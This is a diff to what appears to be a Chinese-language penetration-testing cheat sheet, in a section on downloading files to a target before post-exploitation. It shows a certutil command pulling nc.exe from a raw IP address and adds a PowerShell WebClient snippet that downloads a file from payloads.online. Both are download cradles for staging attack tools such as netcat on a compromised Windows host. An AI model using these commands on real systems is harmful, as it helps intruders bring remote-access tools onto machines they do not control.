@@ -3,6 +3,13 @@
 ## 下载文件
 
 certutil -urlcache -split -f http://11.1.63.39/nc.exe
+
+powershell
+```ts
+$client = new-object System.Net.WebClient
+$client.DownloadFile(‘http://payloads.online/file.tar.gz', ‘E:\file.tar.gz’)
+```
+
 ## 渗透后置操作
 
 ```bash
